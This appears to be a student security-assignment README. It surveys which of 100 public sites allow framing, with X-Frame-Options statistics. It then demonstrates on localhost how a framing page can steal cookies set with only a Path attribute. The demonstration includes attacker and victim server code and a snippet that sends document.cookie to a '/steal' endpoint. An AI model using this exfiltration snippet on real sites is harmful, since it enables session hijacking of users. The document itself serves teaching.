## Which public sites are framable and non framable?


### Youtube Video

* https://youtu.be/9gY36noD-PQ


### List of files and folders

* Codes used
  * [The main HTML page](framable/code/main.html)
  * [Create HTML using Curl](framable/code/create_html_inputs.py)
  * [Node.js server](framable/code/server.js)
  * [Generating the CURL responses](framable/code/curl.py)
  * [Finding X-Frame options](framable/code/xframe.py)


* [framable](framable): 100 HTML files
* [Curl outputs](output): Curl responses are saved here
* [Summary of framability](framable/code/summary.csv)


### Steps

* The [template HTML page](framable/code/main.html) is used to generate the 100 HTML pages for the list of URLS assigned to me.

* The [create_html_inputs](framable/code/create_html_inputs.py) is used to create the 100 seperate HTML pages and save it in a seperate [folder](framable).

* [Curl](framable/code/curl.py) code is used to generate the CURL responses from the 100 assigned URLs to find the X-Frame options to create a summary.

* [Server](framable/code/server.js) is used to check the 100 framable HTML individually to see if the particular site is framable or not. The results are partly given in the [table](framable/code/summary.csv)

* To find the [X-Frame](framable/code/xframe.py) options, a script was used which iterates through the curl outputs and then generates a [table](framable/code/summary.csv)


### Framable sites

* 20minutos.es
* abcnews.go.com
* blog.google
* buydomains.com
* cointernet.com.co
* dreniq.com

### Statistics

* Total number of sites: 100
* Number of framable sites: 26
* Number of non framable sites: 74


### How did the non framable sites defeat the attempt to frame them?

* Most of the sites give a SecurityError message when the [main.html](main.html) code had a snippet to show the error message: "Iframe is not loaded: SecurityError: Sandbox access violation: Blocked a frame at "file://" from accessing a cross-origin frame.  The frame being accessed is sandboxed and lacks the "allow-same-origin" flag."

<img src="images/3.jpeg" width="700">

* Out of the 74 non-framable sites, following were the numbers and header details of sites on how they defeated the attempt to be framed.
  * 15 sites set header to DENY
  * 40 sites set header to SAMEORIGIN
  * 2 sites set header to both DENY and SAMEORIGIN

* There were 43 sites with no "X-Frame-Options" header, which included all the framable sites.

### List of files and folders

* Codes used:
  * [Attacker server](frame-path-attack/attacker.js)
  * [Victim server](frame-path-attack/victim.js)
  * [HTML page with the victim site framed](frame-path-attack/files/html/cookie.html)


### Demonstrating how a parent page can steal cookies from an iframed page if only the Path attribute is used in ```Set-Cookie```


* In order to demonstrate this, used only the Path attribute in ```Set-Cookie```

* The server that hosts the attacker's site:

```
const express = require('express')
const {createReadStream} = require('fs')
const app = express()
const port = 8001

app.get('/', (req, res) => {
  createReadStream('files/html/cookie.html').pipe(res)
})

app.listen(port, () => {
  console.log(`Attacker listens at http://localhost:${port}`)
})

app.use(express.static('files'))
```


* The server that hosts the victim site:
  * Note: The Path attribute is set here to the cookie


```
const express = require('express')
const {createReadStream} = require('fs')
const app = express()
const port = 8002

app.get('/', (req, res) => {
  res.append('Set-Cookie', 'login=IAmIronMan; Path=/')
  res.send("<html><title>Victim Page</title><br><br>Demonstration on how the Path attribute alone is not sufficient<br><script>document.write(document.cookie)</script></html>")
})

app.listen(port, () => {
  console.log(`Victim listens at http://localhost:${port}`)
})
```



* The attacker's HTML running on http://localhost:8001/ contains an iframe that contains the HTML running on http://localhost:8002

    setTimeout(function() {
        const p = document.createElement('p')
        p.innerHTML = document.cookie   /*iframe.contentDocument.cookie */
        document.body.appendChild(p)
        new Image().src = 'http://localhost:5002/steal?cookie=' + document.cookie  /*iframe.contentDocument.cookie*/
}, 5000);
</script>
